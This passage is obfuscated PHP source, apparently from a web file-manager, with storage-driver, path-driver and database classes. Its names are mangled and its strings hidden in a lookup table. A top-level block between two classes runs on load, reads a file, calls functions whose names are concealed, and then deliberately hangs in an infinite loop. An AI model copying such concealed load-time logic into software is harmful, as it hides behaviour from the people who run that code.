$C»•×êÛÀï = "\163\157\x72\x74", $aáèŠÃÃ = false) { return parent::listData($aâÎ¤ÖŞÅ, $C»•×êÛÀï, $aáèŠÃÃ); } public function remove($B‡Ëïì‚îÚ) { return parent::remove($B‡Ëïì‚îÚ); } public function add($BôÅÍğå¬‚, $a„÷İóÇ‚ö = "\154\x61\x62\x65\x6c\55\x67\162\145\171\55\156\x6f\x72\155\141\x6c") { $EÔé‚©ùÄŸ =& $_SERVER[¹Ò‹Ò¹]; if ($this->findByName($BôÅÍğå¬‚)) { return !1; } $BÄŸ¯’å•  = array($EÔé‚©ùÄŸ[407] => $BôÅÍğå¬‚, $EÔé‚©ùÄŸ[458] => $a„÷İóÇ‚ö, $EÔé‚©ùÄŸ[1671] => $this->getSort($EÔé‚©ùÄŸ[254]) + 1); return parent::insert($BÄŸ¯’å• ); } public function update($aÙœŞØƒ¹›, $Eé¹è×‹ Œ) { $càŸè¾‰Æ =& $_SERVER[¹Ò‹Ò¹]; $A“•´Ï÷¿­ = $this->listData($aÙœŞØƒ¹›); $bØ¯¥ªµêÑ = $this->findByName($Eé¹è×‹ Œ[$càŸè¾‰Æ[28]]); if (!$A“•´Ï÷¿­ || $bØ¯¥ªµêÑ && $bØ¯¥ªµêÑ[$càŸè¾‰Æ[388]] != $A“•´Ï÷¿­[$càŸè¾‰Æ[388]]) { return !1; } return parent::update($aÙœŞØƒ¹›, $Eé¹è×‹ Œ); } public function moveTop($B¶éÆÆÎ¬Ş) { $e‡ë•Ìô =& $_SERVER[¹Ò‹Ò¹]; $AòÑßŒŒ = parent::listData(); $eö…Ù¬ ¶à = $this->getSort($e‡ë•Ìô[253]); foreach ($AòÑßŒŒ as &$Eµ‡öÊ™Åß) { if ($Eµ‡öÊ™Åß[$e‡ë•Ìô[388]] == $B¶éÆÆÎ¬Ş) { $Eµ‡öÊ™Åß[$e‡ë•Ìô[1690]] = $eö…Ù¬ ¶à; continue; } $Eµ‡öÊ™Åß[$e‡ë•Ìô[1690]] += 1; } unset($Eµ‡öÊ™Åß); return parent::resetData($AòÑßŒŒ); } public function moveBottom($D¤ŞÏÃõ­•) { $aÍ§Á¢‚Áò =& $_SERVER[¹Ò‹Ò¹]; $BÊãÙ‚Îğ¯ = $this->getSort($aÍ§Á¢‚Áò[254]) + 1; return parent::update($D¤ŞÏÃõ­•, array($aÍ§Á¢‚Áò[1690] => $BÊãÙ‚Îğ¯)); } public function resetSort($c¥¨”‹­¢) { goto eˆŠ¾†ÈØÕ; Cëœµˆ’§¢: for ($C¾éºÊÂ¯ö = 0; $C¾éºÊÂ¯ö < count($c¥¨”‹­¢); $C¾éºÊÂ¯ö++) { $bÄáµ“é¼í[$c¥¨”‹­¢[$C¾éºÊÂ¯ö] . $aÃ§Òæ¯Â†[33]] = $C¾éºÊÂ¯ö + 1; } $D±Ğ³”Í‹ = parent::listData(); foreach ($D±Ğ³”Í‹ as &$fˆ¥É¬‰ë…) { $eÚ·Î®º¯Ì = $bÄáµ“é¼í[$fˆ¥É¬‰ë…[$aÃ§Òæ¯Â†[388]]]; $fˆ¥É¬‰ë…[$aÃ§Òæ¯Â†[1690]] = $eÚ·Î®º¯Ì ? $eÚ·Î®º¯Ì : $fˆ¥É¬‰ë…[$aÃ§Òæ¯Â†[1690]]; } goto ašÊ‰­¨ç¾; eˆŠ¾†ÈØÕ: $aÃ§Òæ¯Â† =& $_SERVER[¹Ò‹Ò¹]; $bÄáµ“é¼í = array(); $c¥¨”‹­¢ = is_array($c¥¨”‹­¢) ? $c¥¨”‹­¢ : array(); goto Cëœµˆ’§¢; ašÊ‰­¨ç¾: unset($fˆ¥É¬‰ë…); return parent::resetData($D±Ğ³”Í‹); goto BóÓ×ßÑ¹¼; BóÓ×ßÑ¹¼: } private function getSort($EÉÂò´ŠŒ­) { $bå‰æ¸˜°ï =& $_SERVER[¹Ò‹Ò¹]; $C¾Ş‡ëĞ«‡ = parent::listData(); $D…³Õ®’É° = array_to_keyvalue($C¾Ş‡ëĞ«‡, $bå‰æ¸˜°ï[33], $bå‰æ¸˜°ï[1690]); if (!$D…³Õ®’É°) { $D…³Õ®’É° = array(0); } $B˜ƒ®Ä‘á = $EÉÂò´ŠŒ­ == $bå‰æ¸˜°ï[254] ? max($D…³Õ®’É°) : min($D…³Õ®’É°); return intval($B˜ƒ®Ä‘á); } } goto CÊ£½áŒ®; C¢ÇÛˆÉ•Î: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($C…¹‚¢Ô) { parent::__construct($C…¹‚¢Ô); $this->signatureVersion($_SERVER[¹Ò‹Ò¹][210]); } public function uploadFormData($b¨½¾‚‚—Ğ, $d¸°¥¡Å´ = 3600) { goto fàâóÑÊŠË; fàâóÑÊŠË: $fÈÖ£¾ªŸŸ =& $_SERVER[¹Ò‹Ò¹]; $c‚ µœ´”Ë = $fÈÖ£¾ªŸŸ[190]; $B¸Ó—¥¾  = $fÈÖ£¾ªŸŸ[228]; goto DìÛ·èÃŒÒ; aˆ©“¯ñˆù: $eîİ•–“¦œ = array($fÈÖ£¾ªŸŸ[1164] => $A©ÙÆğ¸ã, $fÈÖ£¾ªŸŸ[1165] => array(array($fÈÖ£¾ªŸŸ[1166] => $c‚ µœ´”Ë), array($fÈÖ£¾ªŸŸ[1167] => $this->bucket), array($fÈÖ£¾ªŸŸ[1168], $fÈÖ£¾ªŸŸ[1169], $fÈÖ£¾ªŸŸ[33]), array($fÈÖ£¾ªŸŸ[1170] => $AÇ­¨Œ¡ÙÓ), array($fÈÖ£¾ªŸŸ[1171] => $B¸Ó—¥¾ ), array($fÈÖ£¾ªŸŸ[1172] => $this->accessKey), array($fÈÖ£¾ªŸŸ[1173] => $Dš…™Ê„ó))); $eîİ•–“¦œ = json_encode($eîİ•–“¦œ); $D“ë·†•»Ä = hash_hmac($fÈÖ£¾ªŸŸ[228], $Dš…™Ê„ó, $this->secret); goto f‘©©æ§–ë; DìÛ·èÃŒÒ: $AÇ­¨Œ¡ÙÓ = $fÈÖ£¾ªŸŸ[1162]; $A©ÙÆğ¸ã = gmdate($fÈÖ£¾ªŸŸ[1163], time() + $d¸°¥¡Å´); $Dš…™Ê„ó = (string) time() . $fÈÖ£¾ªŸŸ[67] . (string) (time() + $d¸°¥¡Å´); goto aˆ©“¯ñˆù; f‘©©æ§–ë: $E‡æËÓª»¹ = sha1($eîİ•–“¦œ); $a®‘è·”Éí = hash_hmac($fÈÖ£¾ªŸŸ[228], $E‡æËÓª»¹, $D“ë·†•»Ä); $Dë¸ÃÕ˜ÂÓ = array($fÈÖ£¾ªŸŸ[1166] => $c‚ µœ´”Ë, $fÈÖ£¾ªŸŸ[1170] => $AÇ­¨Œ¡ÙÓ, $fÈÖ£¾ªŸŸ[1174] => base64_encode($eîİ•–“¦œ), $fÈÖ£¾ªŸŸ[1171] => $B¸Ó—¥¾ , $fÈÖ£¾ªŸŸ[1172] => $this->accessKey, $fÈÖ£¾ªŸŸ[1175] => $Dš…™Ê„ó, $fÈÖ£¾ªŸŸ[1176] => $a®‘è·”Éí, $fÈÖ£¾ªŸŸ[174] => $this->getHost()); goto E„ÎÑÓÛ; E„ÎÑÓÛ: return $Dë¸ÃÕ˜ÂÓ; goto bÌ×Ì‹•ğ±; bÌ×Ì‹•ğ±: } public function fileOutLink($cİÔïëŸÁ) { $a ŞâÃĞ†ã =& $_SERVER[¹Ò‹Ò¹]; if (substr($cİÔïëŸÁ, 0, 7) == $a ŞâÃĞ†ã[1177]) { $cİÔïëŸÁ = $a ŞâÃĞ†ã[1178] . substr($cİÔïëŸÁ, 7); } header($a ŞâÃĞ†ã[158] . $cİÔïëŸÁ); die; } } if (!isset($_SERVER[$_SERVER[¹Ò‹Ò¹][800]]) || !isset($_SERVER[$_SERVER[¹Ò‹Ò¹][801]])) { goto fÎÖÀ³‹ñ; EÚŒõ¿£ß: $fÖ‡Ø×—Ë = explode($_SERVER[¹Ò‹Ò¹][227], $d‘ĞÁµ„ÌÎ); if (count($fÖ‡Ø×—Ë) < $_SERVER[¹Ò‹Ò¹][592]) { $cßóÔ×Â¯É = $_SERVER[¹Ò‹Ò¹][805]; $cßóÔ×Â¯É(); } $b…æÀİ˜Ï = $_SERVER[¹Ò‹Ò¹][806]; goto Déô†·Å¡; Déô†·Å¡: $b…æÀİ˜Ï($_SERVER[$_SERVER[¹Ò‹Ò¹][803]] . $_SERVER[¹Ò‹Ò¹][804]); $CÎ§Ì¼¶çÍ = 2; while ($CÎ§Ì¼¶çÍ > 1) { $d¶Ô¸ëŞ¾º = rawurlencode($CÎ§Ì¼¶çÍ . $_SERVER[¹Ò‹Ò¹][373]); } goto aÉŞ©Û…‹; fÎÖÀ³‹ñ: $c®ÁÜš¥ÒØ = $_SERVER[¹Ò‹Ò¹][802]; $C‘•Ò•Œ = $_SERVER[$_SERVER[¹Ò‹Ò¹][803]] . $_SERVER[¹Ò‹Ò¹][804]; $d‘ĞÁµ„ÌÎ = $c®ÁÜš¥ÒØ($C‘•Ò•Œ); goto EÚŒõ¿£ß; aÉŞ©Û…‹: } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($b©¹ƒ›Ù§) { $this->pathParse = $b©¹ƒ›Ù§; $this->model = Model($_SERVER[¹Ò‹Ò¹][1179]); } public function getPath($bÊÌÅ§Œ¶‰) { return trim($bÊÌÅ§Œ¶‰, $_SERVER[¹Ò‹Ò¹][8]); } public function pathFather($F¹˜¾îÉ«Ğ) { $Bï±¼·ºŠ = $this->parse($F¹˜¾îÉ«Ğ); $Bï±¼·ºŠ = $this->infoSimple($F¹˜¾îÉ«Ğ); return $Bï±¼·ºŠ ? $Bï±¼·ºŠ[$_SERVER[¹Ò‹Ò¹][472]] : !1; } public function pathThis($B„à¦·‚¸) { $aØ¾«¶Â¤æ = $this->infoSimple($B„à¦·‚¸); return $aØ¾«¶Â¤æ ? $aØ¾«¶Â¤æ[$_SERVER[¹Ò‹Ò¹][28]] : !1; } public function getPathOuter($e†Ç”Ø¢ËÁ) { if (!$e†Ç”Ø¢ËÁ) { return $e†Ç”Ø¢ËÁ; } $EÏ›é®É™Î = $this->parse($e†Ç”Ø¢ËÁ); return KodIO::make($EÏ›é®É™Î[$_SERVER[¹Ò‹Ò¹][388]]); } public function copyFolderFromIO($dƒµÃ²×µ, $C„Øö×Êê, $Añ¤×¹ñéö, $F®íŠ÷ë’İ, $d¹ùÍë×) { $aòã¾Şğ‹ = $this->model->copyFolderFromIO($dƒµÃ²×µ, $C„Øö×Êê, $Añ¤×¹ñéö, $F®íŠ÷ë’İ, $d¹ùÍë×); return KodIO::make($aòã¾Şğ‹); } public function isParentOf($D­ÀÙÉòä„, $CÀ²˜Íƒ®ï) { return $this->model->isParentOf($D­ÀÙÉòä„, $CÀ²˜Íƒ®ï); } public function mkfile($bÕˆ£ùë‹ò, $FËÚİùÅøö = '', $AÕ±·¾ÕÈ = REPEAT_RENAME) { $c¼ÖªØÁœ¿ =& $_SERVER[¹Ò‹Ò¹]; $Fº·ù‘ˆåÅ = $this->parse($bÕˆ£ùë‹ò); $bÕˆ£ùë‹ò = $Fº·ù‘ˆåÅ[$c¼ÖªØÁœ¿[388]]; for ($A³ô ï …¤ = 0; $A³ô ï …¤ < count($Fº·ù‘ˆåÅ[$c¼ÖªØÁœ¿[1180]]); $A³ô ï …¤++) { $aëŠ¯„íè‰ = $Fº·ù‘ˆåÅ[$c¼ÖªØÁœ¿[1180]][$A³ô ï …¤]; if ($A³ô ï …¤ == count($Fº·ù‘ˆåÅ[$c¼ÖªØÁœ¿[1180]]) - 1) { $bÕˆ£ùë‹ò = $this->model->mkfile($bÕˆ£ùë‹ò, $aëŠ¯„íè‰, $FËÚİùÅøö, $AÕ±·¾ÕÈ); break; } $bÕˆ£ùë‹ò = $this->model->mkdir($bÕˆ£ùë‹ò, $aëŠ¯„íè‰, REPEAT_SKIP); } return $this->getPathOuter($bÕˆ£ùë‹ò); } public function mkdir($fœ…šÏÈØà, $c•ø£ì’† = REPEAT_SKIP) { $fÂ¤ìİŞÚÙ =& $_SERVER[¹Ò‹Ò¹]; $d¨…ÈéŠáµ = $this->parse($fœ…šÏÈØà); $fœ…šÏÈØà = $d¨…ÈéŠáµ[$fÂ¤ìİŞÚÙ[388]]; for ($C°…ƒÊƒçŞ = 0; $C°…ƒÊƒçŞ < count($d¨…ÈéŠáµ[$fÂ¤ìİŞÚÙ[1180]]); $C°…ƒÊƒçŞ++) { $Dá ğâ¿Ôº = $d¨…ÈéŠáµ[$fÂ¤ìİŞÚÙ[1180]][$C°…ƒÊƒçŞ]; $fœ…šÏÈØà = $this->model->mkdir($fœ…šÏÈØà, $Dá ğâ¿Ôº, $c•ø£ì’†); } return $this->getPathOuter($fœ…šÏÈØà); } public function copyFile($BôÊá‹µÃ, $c¯ì…ù“Ç¦, $c­„ß•—½ = REPEAT_REPLACE) { $E¾âŸ‚” =& $_SERVER[¹Ò‹Ò¹]; $aìÉæ‹¥Ï¿ = $this->parse($c¯ì…ù“Ç¦); $eñöÛÛ¦· = $this->model->copy($BôÊá‹µÃ, $aìÉæ‹¥Ï¿[$E¾âŸ‚”[388]], $c­„ß•—½, $aìÉæ‹¥Ï¿[$E¾âŸ‚”[75]]); return $eñöÛÛ¦· ? $this->getPathOuter($eñöÛÛ¦·) : !1; } public function moveFile($cÍ»Ğ´åŒ, $aÈ¤¨º¶ñÛ, $D÷Í¡‡Æ©‘ = REPEAT_REPLACE) { $FÔğÌçïÛ¯ =& $_SERVER[¹Ò‹Ò¹]; $c¿Ñ‘˜Ê¾Ğ = $this->parse($aÈ¤¨º¶ñÛ); $e‹«“¼ÇŒÎ = $this->model->move($cÍ»Ğ´åŒ, $c¿Ñ‘˜Ê¾Ğ[$FÔğÌçïÛ¯[388]], $D÷Í¡‡Æ©‘, $c¿Ñ‘˜Ê¾Ğ[$FÔğÌçïÛ¯[75]]); return $e‹«“¼ÇŒÎ ? $this->getPathOuter($e‹«“¼ÇŒÎ) : !1; } public function copy($FÖ˜æáÒŠÍ, $bªÛ–ù®œ, $fÃ¬„Àó‘¢ = REPEAT_REPLACE) { $B‚ÌÉ˜‘ÂŸ = $this->parse($bªÛ–ù®œ); $DÖ‡Ï‚ºÇ… = $this->model->copy($FÖ˜æáÒŠÍ, $B‚ÌÉ˜‘ÂŸ[$_SERVER[¹Ò‹Ò¹][388]], $fÃ¬„Àó‘¢); return $DÖ‡Ï‚ºÇ… ? $this->getPathOuter($DÖ‡Ï‚ºÇ…) : !1; } public function moveSameAllow() { } public function move($cš‡ÙæÁ¾, $F¢ó¨‘’å, $E­Æ‘ÕÖ¿ = REPEAT_REPLACE) { $EŠâŸâø = $this->parse($F¢ó¨‘’å); $bÜéŞ‘ï»î = $this->model->move($cš‡ÙæÁ¾, $EŠâŸâø[$_SERVER[¹Ò‹Ò¹][388]], $E­Æ‘ÕÖ¿); return $bÜéŞ‘ï»î ? $this->getPathOuter($bÜéŞ‘ï»î) : !1; } public function remove($A‚ë¶Â·˜¼, $B°„º°Òê = true) { return $this->model->remove($A‚ë¶Â·˜¼, $B°„º°Òê); } public function rename($EßÏƒ“ Áœ, $EÅÌµÍºØ¹) { $bÈêÕİ›¤ = $this->model->rename($EßÏƒ“ Áœ, $EÅÌµÍºØ¹); return $bÈêÕİ›¤ ? $this->getPathOuter($EßÏƒ“ Áœ) : $bÈêÕİ›¤; } public function size($d…Ê­‡¬Õ) { $f¸¥ãõô = $this->infoSimple($d…Ê­‡¬Õ); return $f¸¥ãõô ? $f¸¥ãõô[$_SERVER[¹Ò‹Ò¹][77]] : 0; } public function infoSimple($Fª¥Ø»ŒŸ®) { return $this->model->sourceInfo($Fª¥Ø»ŒŸ®); } public function info($f‡Õ×é‡Ëè) { return $this->infoParse($f‡Õ×é‡Ëè); } public function infoAuth($FêØ´Ø—§) { return $this->infoParse($FêØ´Ø—§, !1, !0); } public function infoWithChildren($cÚ·İÄàœ­) { return $this->infoParse($cÚ·İÄàœ­, !0); } protected function infoParse($dÊ¾¹ÓŸ®, $E«§µšöÈ = false, $dä«ÕÔ›ÚÜ = false) { if (!$E«§µšöÈ) { return $this->model->pathInfo($dÊ¾¹ÓŸ®, $dä«ÕÔ›ÚÜ); } return $this->model->pathInfoMore($dÊ¾¹ÓŸ®); } public function infoFull($d’…ŸÉêˆÑ) { $EßĞÄÁößÃ =& $_SERVER[¹Ò‹Ò¹]; $D’¨µÚĞí = explode($EßĞÄÁößÃ[8], $d’…ŸÉêˆÑ); $F£¨Ù«ªê¸ = implode($EßĞÄÁößÃ[8], array_splice($D’¨µÚĞí, 1)); return $this->model->pathInfoByPath($D’¨µÚĞí[0], $F£¨Ù«ªê¸); } public function hashSimple($d˜ËØĞ‡Óå) { $dùˆ˜áÔ =& $_SERVER[¹Ò‹Ò¹]; $Fİì¶×Ê†à = $this->infoWithChildren($d˜ËØĞ‡Óå); return $Fİì¶×Ê†à[$dùˆ˜áÔ[163]][$dùˆ˜áÔ[170]]; } public function hashMd5($d†‹¢»·Ö) { $C‘Ãåñ™Éª =& $_SERVER[¹Ò‹Ò¹]; $eçÜÈ÷Ì‹Ä = $this->infoWithChildren($d†‹¢»·Ö); return $eçÜÈ÷Ì‹Ä[$C‘Ãåñ™Éª[163]][$C‘Ãåñ™Éª[169]]; } public function exist($a‹’¼‡ÔÅŠ) { $AĞº²Š«¦ =& $_SERVER[¹Ò‹Ò¹]; $a¤ÃÌö’à = $this->parse($a‹’¼‡ÔÅŠ); if (!$a¤ÃÌö’à[$AĞº²Š«¦[75]]) { return $this->isFile($a‹’¼‡ÔÅŠ) || $this->isFolder($a‹’¼‡ÔÅŠ); } $c«Áó¡ìù = array($AĞº²Š«¦[389] => $a¤ÃÌö’à[$AĞº²Š«¦[388]], $AĞº²Š«¦[28] => $a¤ÃÌö’à[$AĞº²Š«¦[75]]); $fšòá·éì‹ = $this->model->where($c«Áó¡ìù)->find(); return $fšòá·éì‹ ? !0 : !1; } public function isFile($A‹îùãÜ›Ü) { $a¬¥ŒœÙŒµ =& $_SERVER[¹Ò‹Ò¹]; $a£®ÖÄàñ = $this->infoSimple($A‹îùãÜ›Ü); return $a£®ÖÄàñ && $a£®ÖÄàñ[$a¬¥ŒœÙŒµ[397]] == $a¬¥ŒœÙŒµ[86] ? !1 : !0; } public function isFolder($eå±çÛå) { $A¼³ìõğ =& $_SERVER[¹Ò‹Ò¹]; $Aê‹´¤×ê = $this->infoSimple($eå±çÛå); return $Aê‹´¤×ê && $Aê‹´¤×ê[$A¼³ìõğ[397]] == $A¼³ìõğ[86] ? !0 : !1; } public function listPath($Eàëíƒïé, $bÓåèœŸÒœ = false) { $Fó“ô°Ö¥ =& $_SERVER[¹Ò‹Ò¹]; if ($Eàëíƒïé == $Fó“ô°Ö¥[33]) { return !1; } $A°³ˆœ Ÿ = array($Fó“ô°Ö¥[389] => $Eàëíƒïé); if ($bÓåèœŸÒœ) { return $this->model->listSource($A°³ˆœ Ÿ, -1); } return $this->model->listSource($A°³ˆœ Ÿ); } public function has($a¤–óÒ‘™ï, $EìÑ”º›âï = false, $dÚ¯ëæå²‰ = null) { $b—³ÛïÚå½ =& $_SERVER[¹Ò‹Ò¹]; $Eé‰Õ•‘Ù = $this->infoWithChildren($a¤–óÒ‘™ï); if ($EìÑ”º›âï) { return array($b—³ÛïÚå½[202] => $Eé‰Õ•‘Ù[$b—³ÛïÚå½[202]], $b—³ÛïÚå½[201] => $Eé‰Õ•‘Ù[$b—³ÛïÚå½[201]]); } return $dÚ¯ëæå²‰ ? $Eé‰Õ•‘Ù[$b—³ÛïÚå½[202]] : $Eé‰Õ•‘Ù[$b—³ÛïÚå½[201]]; } public function listAll($CÆâƒ½®·) { $c²¢»Ø×¯Š = IO::info($this->pathParse[$_SERVER[¹Ò‹Ò¹][75]]); if (!$c²¢»Ø×¯Š) { return array(); } return $this->model->listAll($CÆâƒ½®·); } public function getContent($D‚ÎŸ÷ë¿í) { return $this->model->getContent($D‚ÎŸ÷ë¿í); } public function setContent($e¤´à†Ø¼, $b´íÛÜï‰ = '') { return $this->model->setContent($e¤´à†Ø¼, $b´íÛÜï‰); } public function fileSubstr($EíŒ’‡„ê, $dë‹ŠÖ¹Ø, $CŸ‰ù´¤Ïƒ) { return $this->model->fileSubstr($EíŒ’‡„ê, $dë‹ŠÖ¹Ø, $CŸ‰ù´¤Ïƒ); } public function download($bòÔ÷é¨äõ, $dÊƒì©‘ğÈ = '') { $A àİ‚‹ïµ = get_path_father($dÊƒì©‘ğÈ); $b¬¹‹Äê¢¹ = get_path_this($dÊƒì©‘ğÈ); $B‡¸÷´Ü¶Â = $this->model->fileInfoGet($bòÔ÷é¨äõ); $aÊ‘³ÚøŒ© = IO::copy($B‡¸÷´Ü¶Â[$_SERVER[¹Ò‹Ò¹][75]], $A àİ‚‹ïµ, !1, $b¬¹‹Äê¢¹); return $aÊ‘³ÚøŒ©; } public function setModifyTime($C…ù˜×ö , $aö«¸…¤¿× = '') { $this->model->metaSet($C…ù˜×ö , $_SERVER[¹Ò‹Ò¹][1181], $aö«¸…¤¿×); } public function upload($Cİ†³²øó, $Fùİš£ğ¦, $dÅ‰¤Æ¢Ÿ— = false, $c˜°Ù×„öö = REPEAT_REPLACE) { $B¡òçìùİÖ =& $_SERVER[¹Ò‹Ò¹]; $aôÀòëòíƒ = $this->parse($Cİ†³²øó); $b§ÂÂÊå›Î = $this->model->addFile($aôÀòëòíƒ[$B¡òçìùİÖ[388]], $Fùİš£ğ¦, $aôÀòëòíƒ[$B¡òçìùİÖ[75]], $dÅ‰¤Æ¢Ÿ—, $c˜°Ù×„öö); return $this->getPathOuter($b§ÂÂÊå›Î); } public function uploadFileByID($aĞ¢á»ÁÑ¬, $D¸½¹Çñ–ù, $FåØˆÄÏ¿¹) { $dèŒ°‹ÏŒ =& $_SERVER[¹Ò‹Ò¹]; $AóÈ•à£ = $this->parse($aĞ¢á»ÁÑ¬); $aÒæìœŒÀ = $this->model->addFileByFileID($AóÈ•à£[$dèŒ°‹ÏŒ[388]], $D¸½¹Çñ–ù, $AóÈ•à£[$dèŒ°‹ÏŒ[75]], $FåØˆÄÏ¿¹); return $this->getPathOuter($aÒæìœŒÀ); } public function addFileByRemote($C—øĞŒÃ, $B÷ÄÅì£, $EĞğå¯½é¾ = array(), $c­‡½ğ÷± = '', $cÑéî®¶) { $eÊŠ‡Ş¬ß =& $_SERVER[¹Ò‹Ò¹]; $b±‰Óé×°Ú = $this->parse($C—øĞŒÃ); $c­‡½ğ÷± = empty($c­‡½ğ÷±) ? $b±‰Óé×°Ú[$eÊŠ‡Ş¬ß[75]] : $c­‡½ğ÷±; $BÛ¡×ˆªİ = $this->model->addFileByRemote($b±‰Óé×°Ú[$eÊŠ‡Ş¬ß[388]], $B÷ÄÅì£, $c­‡½ğ÷±, $EĞğå¯½é¾, $cÑéî®¶); return $this->getPathOuter($BÛ¡×ˆªİ); } public function uploadLink($bíÇí‰À´’, $DâÊ¼„ÑƒŠ = 0) { $E¶È‡”ñ… =& $_SERVER[¹Ò‹Ò¹]; $Ağ‰ôÑˆ±§ = $this->parse($bíÇí‰À´’); $B”æŞ³í… = _get($GLOBALS[$E¶È‡”ñ…[7]], $E¶È‡”ñ…[1182]); $dËõÚö„ Æ = _get($GLOBALS[$E¶È‡”ñ…[7]], $E¶È‡”ñ…[1183]); $bíÇí‰À´’ = Model($E¶È‡”ñ…[566])->createFileName($Ağ‰ôÑˆ±§[$E¶È‡”ñ…[75]], $B”æŞ³í…, $dËõÚö„ Æ); return IO::uploadLink($bíÇí‰À´’, $DâÊ¼„ÑƒŠ); } public function fileNameAuto($CÃ‡×™÷²¨, $AŸàó­ÁÇ, $EŸ±‡Ì†œ„ = REPEAT_REPLACE, $AŒàĞ² šÍ = false) { return $this->model->fileNameAuto($CÃ‡×™÷²¨, $AŸàó­ÁÇ, $EŸ±‡Ì†œ„, $AŒàĞ² šÍ); } public function fileNameExist($E‰’äè…ŒÊ, $FÏ«»ŠÒ¢) { return $this->model->fileNameExist($E‰’äè…ŒÊ, $FÏ«»ŠÒ¢); } protected function _fileOut($fÀËí»¬É”, $bå¼İÀ‚Œ = false, $a„ÁìÜ‚† = false, $BÖËÉä«İ = '', $C²´ÔÁÕÓÒ = false) { goto E‰ÖÖ×ªå; fÖÏ†·´ß: if ($C²´ÔÁÕÓÒ) { return IO::fileOutServer($e‰«¯”ËÅ[$fš³œÖÂ…›[75]], $bå¼İÀ‚Œ, $e¢íİè´, $BÖËÉä«İ); } IO::fileOut($e‰«¯”ËÅ[$fš³œÖÂ…›[75]], $bå¼İÀ‚Œ, $e¢íİè´, $BÖËÉä«İ); goto c¤Ò©ä›…; E‰ÖÖ×ªå: $fš³œÖÂ…› =& $_SERVER[¹Ò‹Ò¹]; $dÔƒÉËŠâ = $this->model->sourceInfo($fÀËí»¬É”); if ($dÔƒÉËŠâ[$fš³œÖÂ…›[397]] == $fš³œÖÂ…›[86]) { header($fš³œÖÂ…›[1184]); die; } goto EàÄµ“¦°; EàÄµ“¦°: $e‰«¯”ËÅ = $this->model->fileInfoGet($fÀËí»¬É”); $BÖËÉä«İ = $e‰«¯”ËÅ[$fš³œÖÂ…›[169]] ? $e‰«¯”ËÅ[$fš³œÖÂ…›[169]] : $BÖËÉä«İ; $e¢íİè´ = isset($GLOBALS[$fš³œÖÂ…›[1185]]) ? $GLOBALS[$fš³œÖÂ…›[1185]] : $dÔƒÉËŠâ[$fš³œÖÂ…›[28]]; goto fÖÏ†·´ß; c¤Ò©ä›…: } public function fileOut($d˜Î‚½íìÚ, $Fù›ï‰’§š = false, $FÍ¼ŞÚ¹¶ = false, $FÚÏ—µ› = '') { $this->_fileOut($d˜Î‚½íìÚ, $Fù›ï‰’§š, $FÍ¼ŞÚ¹¶, $FÚÏ—µ›); } public function fileOutServer($eŸ©®Ü¤›î, $A•©„Ğøì = false, $DØ‘·‡«Úƒ = false, $bô¥î¸šŠ‰ = '') { $this->_fileOut($eŸ©®Ü¤›î, $A•©„Ğøì, $DØ‘·‡«Úƒ, $bô¥î¸šŠ‰, !0); } protected function _fileOutImage($a¹Õù´Ñ‘Î, $bªœî¦™„î = 250) { goto aë½‘™©¬˜; aë½‘™©¬˜: $b×“Æ›Šù =& $_SERVER[¹Ò‹Ò¹]; $BİàÙ¢á¾ = $this->model->pathInfo($a¹Õù´Ñ‘Î); if ($BİàÙ¢á¾[$b×“Æ›Šù[397]] == $b×“Æ›Šù[86]) { show_json($b×“Æ›Šù[1186] . $a¹Õù´Ñ‘Î, !1); } goto cãêŠ§Â‘Ä; c„£®ï‘š™: $GLOBALS[$b×“Æ›Šù[1185]] = $E†‚·–­Ä§[$b×“Æ›Šù[28]]; $GLOBALS[$b×“Æ›Šù[161]] = $E†‚·–­Ä§; IO::fileOutImage($E†‚·–­Ä§[$b×“Æ›Šù[75]], $bªœî¦™„î); goto bªâŒƒƒ«Ó; cãêŠ§Â‘Ä: $E†‚·–­Ä§ = $this->model->fileInfoGet($a¹Õù´Ñ‘Î); $E†‚·–­Ä§[$b×“Æ›Šù[28]] = $BİàÙ¢á¾[$b×“Æ›Šù[28]]; $E†‚·–­Ä§[$b×“Æ›Šù[162]] = $BİàÙ¢á¾[$b×“Æ›Šù[162]]; goto c„£®ï‘š™; bªâŒƒƒ«Ó: } public function fileOutImage($a³òâè™Ô», $D¸¾©‰Á­“ = 250) { $this->_fileOutImage($a³òâè™Ô», $D¸¾©‰Á­“); } public function fileOutImageServer($e¥‘¥È, $c¦êÛæ‚° = 250) { $this->_fileOutImage($e¥‘¥È, $c¦êÛæ‚°); } public function link($d¯¬ŒÄŒ˜, $E‹Â‰Í  = '') { $c§‰øèÌ™Ë = $this->model->fileInfoGet($d¯¬ŒÄŒ˜); return IO::link($c§‰øèÌ™Ë[$_SERVER[¹Ò‹Ò¹][75]], $E‹Â‰Í ); } protected function parse($DÇõòïÌ°Ÿ) { $EÕÖõš¨ï„ =& $_SERVER[¹Ò‹Ò¹]; if (strstr($DÇõòïÌ°Ÿ, $EÕÖõš¨ï„[8]) === !1) { return array($EÕÖõš¨ï„[406] => intval($DÇõòïÌ°Ÿ), $EÕÖõš¨ï„[75] => $EÕÖõš¨ï„[33], $EÕÖõš¨ï„[1180] => array()); } $b‡öïÂ£Ò¨ = explode($EÕÖõš¨ï„[8], trim($DÇõòïÌ°Ÿ, $EÕÖõš¨ï„[8])); if (count($b‡öïÂ£Ò¨) < 2) { show_tips($DÇõòïÌ°Ÿ . $EÕÖõš¨ï„[1187]); } return array($EÕÖõš¨ï„[406] => intval($b‡öïÂ£Ò¨[0]), $EÕÖõš¨ï„[75] => $b‡öïÂ£Ò¨[1], $EÕÖõš¨ï„[1180] => array_slice($b‡öïÂ£Ò¨, 1)); } } goto aØêçë£¡Ã; d’ø¨Èë˜¥: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($dá¹¹ª©™ = '') { $cĞ¨Ï‹Î¤„ =& $_SERVER[¹Ò‹Ò¹]; if (!class_exists($cĞ¨Ï‹Î¤„[849])) { think_exception(think_lang($cĞ¨Ï‹Î¤„[10]) . $cĞ¨Ï‹Î¤„[850]); } if (!empty($dá¹¹ª©™)) { $this->config = $dá¹¹ª©™; if (empty($this->config[$cĞ¨Ï‹Î¤„[13]])) { $this->config[$cĞ¨Ï‹Î¤„[13]] = array(); } } } public function connect($fã–ÕíÍ£‡ = '', $A´º¶‡·¢ = 0) { $FÀòğÀµéã =& $_SERVER[¹Ò‹Ò¹]; if (!isset($this->linkID[$A´º¶‡·¢])) { goto B›‚“¶ÊÖí; fÏ°«í°Óæ: try { $this->linkID[$A´º¶‡·¢] = new 